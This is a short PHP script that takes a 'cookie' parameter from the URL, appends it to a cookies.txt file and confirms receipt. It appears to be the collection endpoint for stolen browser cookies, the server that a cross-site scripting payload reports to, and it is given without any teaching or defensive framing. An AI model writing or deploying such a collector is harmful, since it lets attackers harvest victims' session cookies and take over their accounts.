<?php
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    file_put_contents('cookies.txt', $cookie . "\n", FILE_APPEND);
    echo "Cookie received: " . htmlspecialchars($cookie);
} else {
    echo "No cookie received.";
}
?>
